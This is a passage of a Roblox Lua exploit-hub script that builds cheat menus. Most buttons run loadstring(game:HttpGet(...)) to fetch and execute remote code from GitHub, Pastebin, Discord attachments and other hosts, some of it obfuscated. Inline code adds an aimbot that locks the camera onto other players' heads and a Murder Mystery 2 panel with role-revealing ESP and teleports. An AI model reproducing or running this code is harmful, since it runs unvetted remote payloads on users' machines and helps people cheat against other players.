Script_17.BorderSizePixel = 0
Script_17.Position = UDim2.new(0, 6, 0, 477)
Script_17.Size = UDim2.new(1, -16, 0, 25)
Script_17.Font = Enum.Font.SourceSans
Script_17.Text = "FE Neko"
Script_17.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_17.TextSize = 14.000
Script_17.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/nekomaid.txt"))()
end)

Script_18.Name = "Script"
Script_18.Parent = Container_3
Script_18.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_18.BorderSizePixel = 0
Script_18.Position = UDim2.new(0, 6, 0, 505)
Script_18.Size = UDim2.new(1, -16, 0, 25)
Script_18.Font = Enum.Font.SourceSans
Script_18.Text = "FE Server Admin"
Script_18.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_18.TextSize = 14.000
Script_18.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/server%20admin%20god.txt"))()
end)

Info.Name = "Info"
Info.Parent = Holder
Info.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Info.BackgroundTransparency = 1.000
Info.Size = UDim2.new(1, 0, 1, 0)
Info.Visible = false

Container_4.Name = "Container"
Container_4.Parent = Info
Container_4.Active = true
Container_4.BackgroundColor3 = Color3.fromRGB(45, 72, 200)
Container_4.BorderColor3 = Color3.fromRGB(32, 66, 190)
Container_4.Position = UDim2.new(0, 15, 0, 10)
Container_4.Size = UDim2.new(1, -30, 0, 320)
Container_4.BottomImage = "rbxassetid://368504177"
Container_4.CanvasSize = UDim2.new(0, 0, 0, 297)
Container_4.MidImage = "rbxassetid://368504177"
Container_4.ScrollBarThickness = 5
Container_4.TopImage = "rbxassetid://368504177"

TextLabel_12.Parent = Container_4
TextLabel_12.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_12.BorderSizePixel = 0
TextLabel_12.Position = UDim2.new(0, 6, 0, 6)
TextLabel_12.Size = UDim2.new(1, -17, 0.165625006, 260)
TextLabel_12.Font = Enum.Font.SourceSans
TextLabel_12.Text = ([[

Hello and welcome to T0PK3K Remake!

This gui includes FE scripts that
have been showcased on FO10's
YouTube channel.

Discord:
discord.gg/z6Ggtqh5W8

]])
TextLabel_12.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_12.TextSize = 14.000

Settings.Name = "Settings"
Settings.Parent = Holder
Settings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Settings.BackgroundTransparency = 1.000
Settings.Size = UDim2.new(1, 0, 1, 0)
Settings.Visible = false

Container_5.Name = "Container"
Container_5.Parent = Settings
Container_5.Active = true
Container_5.BackgroundColor3 = Color3.fromRGB(45, 72, 200)
Container_5.BorderColor3 = Color3.fromRGB(32, 66, 190)
Container_5.Position = UDim2.new(0, 15, 0, 10)
Container_5.Size = UDim2.new(1, -30, 0, 320)
Container_5.BottomImage = "rbxassetid://368504177"
Container_5.CanvasSize = UDim2.new(0, 0, 0, 343)
Container_5.MidImage = "rbxassetid://368504177"
Container_5.ScrollBarThickness = 5
Container_5.TopImage = "rbxassetid://368504177"

TextLabel_13.Parent = Container_5
TextLabel_13.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_13.BorderSizePixel = 0
TextLabel_13.Position = UDim2.new(0, 6, 0, 6)
TextLabel_13.Size = UDim2.new(1, -17, 0, 20)
TextLabel_13.Font = Enum.Font.SourceSans
TextLabel_13.Text = "Patch: 1.0a"
TextLabel_13.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_13.TextSize = 14.000

TextLabel_14.Parent = Container_5
TextLabel_14.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_14.BorderSizePixel = 0
TextLabel_14.Position = UDim2.new(0, 6, 0, 29)
TextLabel_14.Size = UDim2.new(1, -17, 0, 20)
TextLabel_14.Font = Enum.Font.SourceSans
TextLabel_14.Text = "Devnote: aWx5 is cool!! i think."
TextLabel_14.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_14.TextSize = 14.000

TextLabel_15.Parent = Container_5
TextLabel_15.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_15.BorderSizePixel = 0
TextLabel_15.Position = UDim2.new(0, 6, 0, 75)
TextLabel_15.Size = UDim2.new(1, -17, 0, 260)
TextLabel_15.Font = Enum.Font.SourceSans
TextLabel_15.Text = ([[
~~~ { CREDITS } ~~~
	
	
FO10 - Scripts Provider

Bubba - Gui

aWx5 - Gui & Gui Scripts

Credit to the script owners

]])
TextLabel_15.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_15.TextSize = 14.000

TextButton.Parent = Container_5
TextButton.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0, 6, 0, 52)
TextButton.Size = UDim2.new(1, -16, 0, 20)
TextButton.Visible = false
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "?"
TextButton.TextColor3 = Color3.fromRGB(199, 199, 199)
TextButton.TextSize = 14.000

Navigation.Name = "Navigation"
Navigation.Parent = Main
Navigation.Active = true
Navigation.BackgroundColor3 = Color3.fromRGB(32, 66, 190)
Navigation.BorderSizePixel = 0
Navigation.Size = UDim2.new(0, 150, 1, 0)
Navigation.ZIndex = 2

Topbar_2.Name = "Topbar"
Topbar_2.Parent = Navigation
Topbar_2.BackgroundColor3 = Color3.fromRGB(60, 119, 191)
Topbar_2.BorderSizePixel = 0
Topbar_2.Size = UDim2.new(1, 0, 0, 30)
Topbar_2.ZIndex = 3

Scroll.Name = "Scroll"
Scroll.Parent = Navigation
Scroll.BackgroundColor3 = Color3.fromRGB(45, 72, 200)
Scroll.BorderSizePixel = 0
Scroll.Position = UDim2.new(0, 0, 0, 30)
Scroll.Size = UDim2.new(1, 0, 1, -30)
Scroll.ZIndex = 2 --2
Scroll.BottomImage = "rbxassetid://368504177"
Scroll.CanvasSize = UDim2.new(0, 0, 0, 403)
Scroll.MidImage = "rbxassetid://368504177"
Scroll.ScrollBarThickness = 5
Scroll.TopImage = "rbxassetid://368504177"

TextButton_2.Parent = Scroll
TextButton_2.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
TextButton_2.BorderSizePixel = 0
TextButton_2.LayoutOrder = 8
TextButton_2.Position = UDim2.new(0, 5, 0, 79)
TextButton_2.Size = UDim2.new(1, -16, 0, 25)
TextButton_2.ZIndex = 4
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Scripts"
TextButton_2.TextColor3 = Color3.fromRGB(199, 199, 199)
TextButton_2.TextSize = 14.000
TextButton_2.MouseButton1Click:Connect(function()
	Scripts.Visible = true
	Home.Visible = false
	Settings.Visible = false
	Info.Visible = false
	LocalPlayer.Visible = false
end)

TextButton_3.Parent = Scroll
TextButton_3.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
TextButton_3.BorderSizePixel = 0
TextButton_3.LayoutOrder = 12
TextButton_3.Position = UDim2.new(0, 5, 0, 114)
TextButton_3.Size = UDim2.new(1, -16, 0, 25)
TextButton_3.ZIndex = 4
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Settings"
TextButton_3.TextColor3 = Color3.fromRGB(199, 199, 199)
TextButton_3.TextSize = 14.000
TextButton_3.MouseButton1Click:Connect(function()
	Scripts.Visible = false
	Home.Visible = false
	Settings.Visible = true
	Info.Visible = false
	LocalPlayer.Visible = false
end)

TextButton_4.Parent = Scroll
TextButton_4.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
TextButton_4.BorderSizePixel = 0
TextButton_4.LayoutOrder = 4
TextButton_4.Position = UDim2.new(0, 5, 0, 148)
TextButton_4.Size = UDim2.new(1, -16, 0, 25)
TextButton_4.Visible = false
TextButton_4.ZIndex = 4
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "?"
TextButton_4.TextColor3 = Color3.fromRGB(199, 199, 199)
TextButton_4.TextSize = 14.000

TextButton_5.Parent = Scroll
TextButton_5.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
TextButton_5.BorderSizePixel = 0
TextButton_5.LayoutOrder = 1
TextButton_5.Position = UDim2.new(0, 6, 0, 10)
TextButton_5.Size = UDim2.new(1, -16, 0, 25)
TextButton_5.ZIndex = 4
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "Home"
TextButton_5.TextColor3 = Color3.fromRGB(199, 199, 199)
TextButton_5.TextSize = 14.000
TextButton_5.MouseButton1Click:Connect(function()
	Scripts.Visible = false
	Home.Visible = true
	Settings.Visible = false
	Info.Visible = false
	LocalPlayer.Visible = false
end)

TextButton_6.Parent = Scroll
TextButton_6.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
TextButton_6.BorderSizePixel = 0
TextButton_6.LayoutOrder = 2
TextButton_6.Position = UDim2.new(0, 6, 0, 43)
TextButton_6.Size = UDim2.new(1, -16, 0, 25)
TextButton_6.ZIndex = 4
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "Info"
TextButton_6.TextColor3 = Color3.fromRGB(199, 199, 199)
TextButton_6.TextSize = 14.000
TextButton_6.MouseButton1Click:Connect(function()
	Scripts.Visible = false
	Home.Visible = false
	Settings.Visible = false
	Info.Visible = true
	LocalPlayer.Visible = false
end)

DisabledCommand.Name = "DisabledCommand"
DisabledCommand.Parent = Main
DisabledCommand.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
DisabledCommand.BorderColor3 = Color3.fromRGB(54, 81, 151)
DisabledCommand.Position = UDim2.new(0, 163, 0, 366)
DisabledCommand.Size = UDim2.new(1, -176, 0, 20)
DisabledCommand.Visible = false
DisabledCommand.Font = Enum.Font.Code
DisabledCommand.PlaceholderText = "Press ; to enter a DisabledCommand"
DisabledCommand.ShowNativeInput = false
DisabledCommand.Text = ""
DisabledCommand.TextColor3 = Color3.fromRGB(209, 209, 209)
DisabledCommand.TextSize = 12.000
DisabledCommand.TextStrokeTransparency = 0.800
DisabledCommand.TextTransparency = 0.300

Label.Name = "Label"
Label.Parent = Main
Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Label.BackgroundTransparency = 1.000
Label.BorderSizePixel = 0
Label.Position = UDim2.new(0.0191489346, 0, -0.00253164582, 0)
Label.Size = UDim2.new(0, 113, 0, 30)
Label.ZIndex = 4
Label.Font = Enum.Font.SourceSansBold
Label.Text = "T0PK3K REMAKE"
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.TextSize = 18.000

--{ Scripts: }--

local RunService = game:GetService("RunService")

spawn(function()
        while true do
            TextLabel_4.Text = "Server Time: "..tostring(game:GetService('Workspace').DistributedGameTime)
            wait(.5)
        end
end)

spawn(function()
        while true do
            TextLabel_5.Text = "Server Size: "..tostring(game:GetService('Players').NumPlayers)
            wait(.5)
        end
end)

spawn(function()
RunService.RenderStepped:Connect(function(frame)
	TextLabel_8.Text = "FPS: "..(math.round(1/frame))
end)
end)


--{ End of Code }--
end)

Section:NewButton("Bloodfest GUI", "Game Gui lol", function()
loadstring(game:HttpGet("https://pastebin.com/raw/MyuKiH2q", true))()
end)

Section:NewButton("AimBot Gui", "Its old but useful", function()
   -- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Frame.BorderColor3 = Color3.fromRGB(16, 16, 16)
Frame.Position = UDim2.new(0.326547235, 0, 0.442340851, 0)
Frame.Size = UDim2.new(0.346905529, 0, 0.194492236, 0)

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
Frame_2.BorderColor3 = Color3.fromRGB(16, 16, 16)
Frame_2.Size = UDim2.new(1, 0, 0.26777932, 0)

TextLabel.Parent = Frame_2
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Size = UDim2.new(1.00234735, 0, 1.08253634, 0)
TextLabel.Font = Enum.Font.SourceSansSemibold
TextLabel.Text = "Arceus | Aimbot"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 16.000

TextButton.Parent = Frame_2
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Position = UDim2.new(0.92957741, 0, 0, 0)
TextButton.Size = UDim2.new(0.0697798356, 0, 0.991438508, 0)
TextButton.Font = Enum.Font.SourceSansSemibold
TextButton.Text = "_"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14.000

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_2.BorderColor3 = Color3.fromRGB(20, 20, 20)
TextButton_2.Position = UDim2.new(0.0492957756, 0, 0.495575249, 0)
TextButton_2.Size = UDim2.new(0.0469483584, 0, 0.176991165, 0)
TextButton_2.Font = Enum.Font.SourceSansSemibold
TextButton_2.Text = ""
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 20.000
TextButton_2.TextWrapped = true

TextLabel_2.Parent = TextButton_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(1.54999995, 0, 0, 0)
TextLabel_2.Size = UDim2.new(17.7999992, 0, 1, 0)
TextLabel_2.Font = Enum.Font.SourceSansSemibold
TextLabel_2.Text = "Aimbot"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 16.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

-- Scripts:

local function RPTXOJ_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local state = true
	script.Parent.MouseButton1Down:Connect(function()
		print"t"
		state = not state
		local LB_Size = script.Parent.Parent.AbsoluteSize
		local NW_Size = UDim2.new(0, LB_Size.X, 0, LB_Size.Y)
		if not state then
			script.Parent.Text = "+"
			game:GetService("TweenService"):Create(script.Parent.Parent.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
				BackgroundTransparency = 1
			}):Play()
			for i, v in pairs(script.Parent.Parent.Parent:GetChildren()) do
				if v:IsA("TextButton") then 
					v.Visible = false
					v.TextLabel.Visible = false
				end
			end
		else
			script.Parent.Text = "_"
			game:GetService("TweenService"):Create(script.Parent.Parent.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
				BackgroundTransparency = 0
			}):Play()
			for i, v in pairs(script.Parent.Parent.Parent:GetChildren()) do
				if v:IsA("TextButton") then 
					v.Visible = true
					v.TextLabel.Visible = true
				end
			end
		end
	end)
end
coroutine.wrap(RPTXOJ_fake_script)()
local function CIXXD_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	local state = false
	script.Parent.MouseButton1Down:Connect(function()
		state = not state
		if state then 
			script.Parent.Text = "x"
		else
			script.Parent.Text = ""
		end
	end)
	
	local Cam = workspace.CurrentCamera
	
	local hotkey = true
	function lookAt(target, eye)
		Cam.CFrame = CFrame.new(target, eye)
	end
	
	function getClosestPlayerToCursor(trg_part)
		local nearest = nil
		local last = math.huge
		for i,v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer and game.Players.LocalPlayer.Character and v.Character and v.Character:FindFirstChild(trg_part) then
				if game.Players.LocalPlayer.Character:FindFirstChild(trg_part) then
					local ePos, vissss = workspace.CurrentCamera:WorldToViewportPoint(v.Character[trg_part].Position)
					local AccPos = Vector2.new(ePos.x, ePos.y)
					local mousePos = Vector2.new(workspace.CurrentCamera.ViewportSize.x / 2, workspace.CurrentCamera.ViewportSize.y / 2)
					local distance = (AccPos - mousePos).magnitude
					if distance < last and vissss and hotkey and distance < 400 then
						last = distance
						nearest = v
					end
				end
			end
		end
		return nearest
	end
	
	game:GetService("RunService").RenderStepped:Connect(function()
		local closest = getClosestPlayerToCursor("Head")
		if state and closest and closest.Character:FindFirstChild("Head") then
			lookAt(Cam.CFrame.p, closest.Character:FindFirstChild("Head").Position)
		end
	end)
end
coroutine.wrap(CIXXD_fake_script)()
local function QNWNII_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	script.Parent.Active = true
	script.Parent.Selectable = true
	script.Parent.Draggable = true
end
coroutine.wrap(QNWNII_fake_script)()
end)

Section:NewButton("LegonX Hub", "New and Op", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/Lmaz8vF7'),true))();
end)










































--Game Cheat--
local Tab = Window:NewTab("Game")
local Section = Tab:NewSection("ALL GAMES CHEAT")

local Section = Tab:NewSection("Rol Ghoul")
Section:NewButton("Rol Ghoul Gui 1(New)", "idk what to say lol", function()
--For Zen Hub | Ro ghoul V1
loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/Roghoul", true))()
end)

Section:NewButton("Rol Ghoul Gui 2(New)", "Ohh", function()
loadstring(game:HttpGet(("https://aizen.ml/weis/RoGhoul.lua")))()
end)




local Section = Tab:NewSection("Pet Simulator X")

Section:NewButton("PetSimX GUI 1(New)", "PetSimX 3", function()
    loadstring(game:HttpGet"https://rawscripts.net/raw/Project-Meow_421")()
end)

Section:NewButton("PetSimX GUI 2", "Cheat in pet game lol", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/Script"))()
end)

Section:NewButton("PetSimx GUI 3(New)", "Damn idk", function()
loadstring(game:HttpGet("https://github.com/HazeNx/shimbo/raw/main/euphoria.lua"))()
end)





local Section = Tab:NewSection("BedWars")

Section:NewButton("BedWar GUI 1(New)", "Bedwars GUI 1", function()
    loadstring(game:HttpGet("https://cdn.discordapp.com/attachments/1002510858917773352/1002895558790361158/untitled.txt"))()
end)

Section:NewButton("BedWars GUI 2(New)", "Bedwar 3", function()
    --MoonLight Beta
loadstring(game:HttpGet(("https://cdn.discordapp.com/attachments/980105264684478464/1002239072217092106/MoonLightBeta.txt"), true))()
end)

Section:NewButton("BedWars 3", "Bedwars 3", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/joeengo/Future/main/loadstring.lua', true))()
end)

Section:NewButton("Bedwar 4", "Credit to Owner", function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/NightbedX/main/NightbedScriptLol/mostNightbed.lua", true))()
end)

Section:NewButton("Bedwar 5", "Credit to Owner", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
end)

Section:NewButton("Bedwar 6", "Credit to Owner", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/8pmX8/moonlight.cool/main/mlobfuscated.lua'))();
end)

Section:NewButton("Bedwar 7(New)", "Credit to Owner", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/JN-HH-Gaming-Future-Is-Good/main/Future%20Fixed"))()
end)

Section:NewButton("Bedwar 8(New)", "Credit to the owner", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/bedwars/main/Script", true))()
end)





local Section = Tab:NewSection("BrookHaven")

Section:NewButton("BrookHaven 1", "ICEHUB GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
end)








local Section = Tab:NewSection("Murder Mystery 2")

Section:NewButton("MM2 GUI 1", "use keyboard for some ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Drifter0507/scripts/main/mm2", true))()
end)

Section:NewButton("MM2 GUI 2", "use keyboard for some ", function()
   loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
end)

Section:NewButton("MM2 GUI 3(New)", "use keyboard for some ", function()
local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()

local w = library:CreateWindow("Mm2Hub-Micro") -- Creates the window

local b = w:CreateFolder("Mm2Scripts") -- Creates the folder(U will put here your buttons,etc)

b:Label("Murder Mystery",{
    TextSize = 25; -- Self Explaining
    TextColor = Color3.fromRGB(255,255,255); -- Self Explaining
    BgColor = Color3.fromRGB(69,69,69); -- Self Explaining
    
}) 

b:Button("Mm2 Script 1",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Drifter0507/scripts/main/mm2", true))()
end)

b:Button("Mm2 Script 2",function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/MM2%20Admin%20Panel'),true))()
end)

b:Button("Mm2 Script 2",function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Neon-Fox/roblox-scripts/main/VynixuMM2"))()
end)

b:Toggle("Toggle",function(state)
    shared.toggle = state
    print("Toggled")
end)

b:Slider("Slider",{
    min = 10; -- min value of the slider
    max = 50; -- max value of the slider
    precise = true; -- max 2 decimals
},function(value)
    print(value)
end)

b:Dropdown("Dropdown",{"A","B","C"},true,function(mob) --true/false, replaces the current title "Dropdown" with the option that t
    print(mob)
end)

b:Bind("Bind",Enum.KeyCode.C,function() --Default bind
    print("Yes")
end)

b:ColorPicker("ColorPicker",Color3.fromRGB(255,0,0),function(color) --Default color
    print(color)
end)

b:Box("Box","number",function(value) -- "number" or "string"
    print(value)
end)

b:DestroyGui()

end)

Section:NewButton("MM2 GUI 4(New)", "This is new", function()
   loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/16d946bfe0a0ed98a8e32de362fd4217/raw/0681fa979da042841f4e71a52490fdc3a2a16376/cac", true))()
end)

Section:NewButton("MM2 GUI 5(New)", "This is new", function()
-- Gui to Lua
-- Version: 3

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ESPon = Instance.new("TextButton")
local ESPOff = Instance.new("TextButton")
local Bringgun = Instance.new("TextButton")
local ToMurderer = Instance.new("TextButton")
local ToLOBBY = Instance.new("TextButton")
local HIDE = Instance.new("TextButton")
local OPEN = Instance.new("TextButton")
local ToSherrif = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(0, 0, 0)
Frame.Position = UDim2.new(0.166156977, 0, 0, 0)
Frame.Size = UDim2.new(0, 163, 0, 454)

ESPon.Name = "ESPon"
ESPon.Parent = ScreenGui
ESPon.BackgroundColor3 = Color3.new(0, 1, 0)
ESPon.Position = UDim2.new(0.166156977, 0, -4.41335142e-05, 0)
ESPon.Size = UDim2.new(0, 163, 0, 50)
ESPon.Font = Enum.Font.SourceSans
ESPon.Text = "ESP ON"
ESPon.TextColor3 = Color3.new(0, 0, 0)
ESPon.TextScaled = true
ESPon.TextSize = 14
ESPon.TextWrapped = true

ESPOff.Name = "ESPOff"
ESPOff.Parent = ScreenGui
ESPOff.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
ESPOff.Position = UDim2.new(0.166156977, 0, 0.105935514, 0)
ESPOff.Size = UDim2.new(0, 163, 0, 50)
ESPOff.Font = Enum.Font.SourceSans
ESPOff.Text = "ESP OFF"
ESPOff.TextColor3 = Color3.new(0, 0, 0)
ESPOff.TextScaled = true
ESPOff.TextSize = 14
ESPOff.TextWrapped = true

Bringgun.Name = "Bringgun"
Bringgun.Parent = ScreenGui
Bringgun.BackgroundColor3 = Color3.new(0, 0, 1)
Bringgun.Position = UDim2.new(0.166156977, 0, 0.211999387, 0)
Bringgun.Size = UDim2.new(0, 163, 0, 50)
Bringgun.Font = Enum.Font.SourceSans
Bringgun.Text = "Bring Gun"
Bringgun.TextColor3 = Color3.new(0, 0, 0)
Bringgun.TextScaled = true
Bringgun.TextSize = 14
Bringgun.TextWrapped = true

ToMurderer.Name = "ToMurderer"
ToMurderer.Parent = ScreenGui
ToMurderer.BackgroundColor3 = Color3.new(1, 0.741176, 0.0784314)
ToMurderer.Position = UDim2.new(0.166156977, 0, 0.319503635, 0)
ToMurderer.Size = UDim2.new(0, 163, 0, 50)
ToMurderer.Font = Enum.Font.SourceSans
ToMurderer.Text = "To Murderer"
ToMurderer.TextColor3 = Color3.new(0, 0, 0)
ToMurderer.TextScaled = true
ToMurderer.TextSize = 14
ToMurderer.TextWrapped = true

ToLOBBY.Name = "ToLOBBY"
ToLOBBY.Parent = ScreenGui
ToLOBBY.BackgroundColor3 = Color3.new(1, 1, 1)
ToLOBBY.Position = UDim2.new(0.166156977, 0, 0.425186396, 0)
ToLOBBY.Size = UDim2.new(0, 163, 0, 50)
ToLOBBY.Font = Enum.Font.SourceSans
ToLOBBY.Text = "To Lobby"
ToLOBBY.TextColor3 = Color3.new(0, 0, 0)
ToLOBBY.TextScaled = true
ToLOBBY.TextSize = 14
ToLOBBY.TextWrapped = true

HIDE.Name = "HIDE"
HIDE.Parent = ScreenGui
HIDE.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
HIDE.Position = UDim2.new(0.166156977, 0, 0.724320531, 0)
HIDE.Size = UDim2.new(0, 163, 0, 56)
HIDE.Font = Enum.Font.SourceSans
HIDE.Text = "HIDE"
HIDE.TextColor3 = Color3.new(0, 0, 0)
HIDE.TextScaled = true
HIDE.TextSize = 14
HIDE.TextWrapped = true

OPEN.Name = "OPEN"
OPEN.Parent = ScreenGui
OPEN.Active = false
OPEN.BackgroundColor3 = Color3.new(0.0117647, 1, 0.0117647)
OPEN.Position = UDim2.new(0, 0, 0.0418502204, 0)
OPEN.Size = UDim2.new(0, 116, 0, 19)
OPEN.Visible = false
OPEN.Font = Enum.Font.SourceSans
OPEN.Text = "OPEN"
OPEN.TextColor3 = Color3.new(0, 0, 0)
OPEN.TextScaled = true
OPEN.TextSize = 14
OPEN.TextWrapped = true

ToSherrif.Name = "ToSherrif"
ToSherrif.Parent = ScreenGui
ToSherrif.BackgroundColor3 = Color3.new(1, 0.741176, 0.0784314)
ToSherrif.Position = UDim2.new(0.166156977, 0, 0.533537149, 0)
ToSherrif.Size = UDim2.new(0, 163, 0, 50)
ToSherrif.Font = Enum.Font.SourceSans
ToSherrif.Text = "To Sherrif"
ToSherrif.TextColor3 = Color3.new(0, 0, 0)
ToSherrif.TextScaled = true
ToSherrif.TextSize = 14
ToSherrif.TextWrapped = true

-- Scripts:

local function XVGFY_fake_script() -- ScreenGui.LocalScript
local script = Instance.new('LocalScript', ScreenGui)

-- FUNCTIONS
function murderer()
for i, v in pairs(game.Players:children()) do
if  v.Backpack:findFirstChild("Knife") or v.Character:findFirstChild("Knife") then
return v
end
end
end

function sherrif()
for i, v in pairs(game.Players:children()) do
if  v.Backpack:findFirstChild("Gun") or v.Character:findFirstChild("Gun") then
return v
end
end
end


-- ESP ON BUTTON

script.Parent.ESPon.MouseButton1Down:connect(function()
for i, v in pairs(game.Players:children()) do
if v.Backpack:findFirstChild("Knife") or v.Character:findFirstChild("Knife") then
local esp = Instance.new("BoxHandleAdornment")
esp.Parent = v.Character.Head
esp.Size = Vector3.new(1,1,1)
esp.Color3 = Color3.new(255, 0, 0)
esp.AlwaysOnTop = true
esp.Adornee = v.Character.Head
esp.Visible = true
esp.ZIndex = 2

elseif v.Backpack:findFirstChild("Gun") or v.Character:findFirstChild("Gun") then
local esp = Instance.new("BoxHandleAdornment")
esp.Parent = v.Character.Head
esp.Size = Vector3.new(1,1,1)
esp.Color3 = Color3.new(0, 0, 255)
esp.AlwaysOnTop = true
esp.Adornee = v.Character.Head
esp.Visible = true
esp.ZIndex = 2
else
local esp = Instance.new("BoxHandleAdornment")
esp.Parent = v.Character.Head
esp.Size = Vector3.new(1,1,1)
esp.Color3 = Color3.new(0, 255, 0)
esp.AlwaysOnTop = true
esp.Adornee = v.Character.Head
esp.Visible = true
esp.ZIndex = 2
end

end

end)

-- ESP OFF BUTTON

script.Parent.ESPOff.MouseButton1Down:connect(function()
for i, v in pairs(game.Players:children()) do
for i, a in pairs(v.Character.Head:children()) do
if a.ClassName == "BoxHandleAdornment" then
a:remove()
end
end
end
end)

-- BRING GUN BUTTON

script.Parent.Bringgun.MouseButton1Down:connect(function()
if game.Workspace:FindFirstChild("GunDrop") then
game.Workspace.GunDrop.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
end
end)

-- TO LOBBY BUTTON

script.Parent.ToLOBBY.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Lobby.Radio.CFrame
end)

-- TO Murderer Button

script.parent.ToMurderer.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = murderer().Character.HumanoidRootPart.CFrame
end)


-- TO Sherriff button

script.Parent.ToSherrif.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = sherrif().Character.HumanoidRootPart.CFrame
end)

-- Hide Button

script.Parent.HIDE.MouseButton1Down:connect(function()
for i, v in pairs(script.Parent:children()) do
if v.Name ~= "OPEN" then
v.Visible = false
v.Active = false

else
v.Active = true
v.Visible = true
end
end
end)

-- Open Button

script.Parent.OPEN.MouseButton1Down:connect(function()
